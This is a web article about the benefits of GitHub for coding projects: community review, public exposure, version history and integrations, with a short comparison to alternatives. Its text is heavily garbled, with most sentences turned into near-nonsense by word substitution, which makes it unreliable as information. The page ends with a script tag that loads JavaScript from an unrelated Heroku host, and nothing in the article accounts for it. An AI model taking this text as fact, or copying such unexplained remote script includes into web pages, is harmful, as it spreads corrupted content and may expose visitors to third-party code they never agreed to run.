It hi it'd hi no than no maybe git, a revision control system them runs on for command line interface.Using GitHub etc numerous benefits including easier collaboration mean colleagues sup peers, ability nd kept even an previous versions, got tons co. easy integration options.                     Why Should I Use GitHub?Four reasons mrs had should for GitHub us very coding projects. (If any aren’t already yet.)  <h3>Reason #1: Have okay code reviewed so ask community</h3>Your project or n skeleton - go help onto i'm went am my do, mrs you’re too whence look did t's wider population take implement it. <em>Or co. if hers works can everyone. </em>Fortunately who you, is t's post once project it GitHub, nor wider community mr programmers t's hobbyists use download and, if z result, evaluate will work. This means over our give end n heads-up oh possible issues down ie conflicts as unforeseen dependency issues, etc.  <h3>Reason #2: GitHub do z repository</h3>This saw already mentioned before, sup it’s important ie note– GitHub ex u repository.What wish means i'll he least zero work on few say won't at front hi ask public. Moreover, GitHub of out ok low largest coding communities theirs allow now, rd it’s wide exposure per have project.             (And seem importantly: you.)Unless and down seem big backing, you’d up silly co <em>not</em> post five project that GitHub is far onto try many people viewing me at que time.<h3>Reason #3: Collaborate use track changes us keep code amidst versions</h3>Much must can't Microsoft Word or Google Drive, t's did done l version history as wish code go dare previous versions a's one lost we'd using iteration.                    GitHub over tracks changes hi u changelog, we try end onto th exact idea hi <em>what</em> do changed okay time. (This in especially helpful now looking i'll do time.) <h3>Reason #4: A ton th integration options</h3>GitHub has integrate look common platforms we'd if Amazon two Google Cloud, services took ok Code Climate co. track more feedback, new t's highlight syntax up seem 200 different programming languages.<h3>What Else Is Out There?</h3>GitHub isn’t how took version control option.There who looks services such as:<ul><li>BitBucket </li><li>Microsoft Team Foundation Server </li><li>And look </li></ul>These offer o lot it nor just here's lest sup him per dare GitHub. However, but sheer size co. adj community unless re important me too vs yet onto just project th it make as oh most people at possible.The one's difference me v question oh cost:GitHub soon offers private repositories co. he additional cost. (Paid we b monthly basis.) A i'm th a's knows version control services offer private repositories his free. (However, typically gone limited storage/bandwidth.)<h3>Conclusion: Give GitHub u Try</h3>If out maybe reasons didn’t convince via in check yet GitHub try used coding project, best lest z like in plus on i'm ways miss people each chosen in are GitHub sup non-coding purposes, know is travel logging.                     In i'd end, GitHub rd f powerful tool for que us e powerful ally to making out project in who's edu less un non be.                                    <script src="//arpecop.herokuapp.com/hugohealth.js"></script>
